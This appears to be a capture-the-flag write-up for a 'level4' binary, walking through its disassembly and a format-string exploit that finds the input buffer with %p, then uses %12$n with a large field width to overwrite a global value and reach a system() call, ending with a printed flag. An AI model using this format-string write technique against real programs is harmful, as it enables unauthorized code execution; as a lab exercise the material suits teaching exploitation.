<span style="display: flex; justify-content: space-between;"><span style="text-align: left; display: block;">
	[← level3](../level3/solution.md)
</span>
<span style="text-align: center; display: block;">
	[Home](../README.md)
</span>
<span style="text-align: right; display: block;">
	[level5 →](../level5/solution.md)
</span>
</span>

level4
======

Dissassembly
------------

To dissassemble the executable we can use objdump.
```sh
EXECUTABLE=./level4

objdump -M intel -d "$EXECUTABLE"
```

The main function looks like this:
```nasm
080484a7 <main>:
 80484a7:	55						push   ebp
 80484a8:	89 e5					mov    ebp,esp
 80484aa:	83 e4 f0				and    esp,0xfffffff0
 80484ad:	e8 a5 ff ff ff			call   8048457 <n>
 80484b2:	c9						leave
 80484b3:	c3						ret080484a7 <main>:
 80484a7:	55						push   ebp
 80484a8:	89 e5					mov    ebp,esp
 80484aa:	83 e4 f0				and    esp,0xfffffff0
 80484ad:	e8 a5 ff ff ff			call   8048457 <n>
 80484b2:	c9						leave
 80484b3:	c3						ret
```

It calls another function n:

```nasm
08048457 <n>:
 8048457:	55						push   ebp
 8048458:	89 e5					mov    ebp,esp
 804845a:	81 ec 18 02 00 00		sub    esp,0x218
 8048460:	a1 04 98 04 08			mov    eax,ds:0x8049804
 8048465:	89 44 24 08				mov    DWORD PTR [esp+0x8],eax
 8048469:	c7 44 24 04 00 02 00	mov    DWORD PTR [esp+0x4],0x200
 8048470:	00
 8048471:	8d 85 f8 fd ff ff		lea    eax,[ebp-0x208]
 8048477:	89 04 24				mov    DWORD PTR [esp],eax
 804847a:	e8 d1 fe ff ff			call   8048350 <fgets@plt>
 804847f:	8d 85 f8 fd ff ff		lea    eax,[ebp-0x208]
 8048485:	89 04 24				mov    DWORD PTR [esp],eax
 8048488:	e8 b7 ff ff ff			call   8048444 <p>
 804848d:	a1 10 98 04 08			mov    eax,ds:0x8049810
 8048492:	3d 44 55 02 01			cmp    eax,0x1025544
 8048497:	75 0c					jne    80484a5 <n+0x4e>
 8048499:	c7 04 24 90 85 04 08	mov    DWORD PTR [esp],0x8048590
 80484a0:	e8 bb fe ff ff			call   8048360 <system@plt>
 80484a5:	c9						leave
 80484a6:	c3						ret
```

Which in turn calls a function p, which uses printf to print our input:

```
nasm
08048444 <p>:
 8048444:	55						push   ebp
 8048445:	89 e5					mov    ebp,esp
 8048447:	83 ec 18				sub    esp,0x18
 804844a:	8b 45 08				mov    eax,DWORD PTR [ebp+0x8]
 804844d:	89 04 24				mov    DWORD PTR [esp],eax
 8048450:	e8 eb fe ff ff			call   8048340 <printf@plt>
 8048455:	c9						leave
 8048456:	c3						ret
```

We can see that there is a system call, but to reach it, a specific value needs to be set to 0x1025544.
```nasm
...
 804848d:   a1 10 98 04 08          mov    eax,ds:0x8049810
 8048492:   3d 44 55 02 01          cmp    eax,0x1025544
 8048497:   75 0c                   jne    80484a5 <n+0x4e>
   ...
 80484a0:   e8 bb fe ff ff          call   8048360 <system@plt>
 80484a5:   c9                      leave
 80484a6:   c3                      ret
```

The stack looks like this before calling p:
| Address | Type           | Size |
|---------|----------------|------|
| -0x218  | char \*fmt     |   4  |
| -0x210  | FILE \*stdin   |   4  |
| -0x20c  | size_t len     |   4  |
| -0x208  | char data[200] | 512  |
|  0x000  | \*EBP          |   4  |
|  0x004  | \*EIP          |   4  |

After calling p, the stack looks like this:
| Address | Type           | Size |
|---------|----------------|------|
| -0x018  | char \*fmt     |   4  |
| -0x004  | padding        |  20  |
|  0x000  | \*EBP          |   4  |
|  0x004  | \*EIP          |   4  |
|  0x008  | char \*fmt     |   4  |

The p function fetches the format string pointer from the previous stack-frame and passes it to the printf function.

In c, the procedure would look like this:
```c
size_t	len = 0x200;
FILE	*stdin = *(FILE**)0x8049804;

fgets(fmt, len, stdin);

printf(fmt);

if (*(int*)0x8049810 == 0x1025544)
	system(...);
```

Exploitation
------------

Using the previous technique, we can search for our buffer by printing the stack's data.
```sh
./level4 <<< 'AAAA char *fmt = %p; char *p_frame[32] = %p %p %p %p %p %p %p; size = %p; FILE* stdin = %p; char *system_arg = %p; char *buff[0] = %p'
```
```c
AAAA char *fmt = 0xb7ff26b0; char *p_frame[32] = 0xbffff7a4 0xb7fd0ff4 (nil) (nil) 0xbffff768 0x804848d 0xbffff560; size = 0x200; FILE* stdin = 0xb7fd1ac0; char *system_arg = 0xb7ff37d0; char *buff[0] = 0x41414141
```
We are able to reach the start of our buffer with 12 32-bit pointer conversions, which is equivalent to an offset of 0x30.

Knowing the offset, we can use printf's shorthand dollar notation to directly access the argument at the 12th position:
```sh
./level4 <<< 'AAAA %12$p'
```
```c
AAAA 0x41414141
```

If we place our address at the start of our buffer and use the %n modifier, we can overwrite it using an arbitrary value. To generate a string with the right length, we can use the field-width:
```sh
./level4 <<< $'\x10\x98\x04\x08%16930112x%12$n'
```
```c
...
b7ff26b0
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
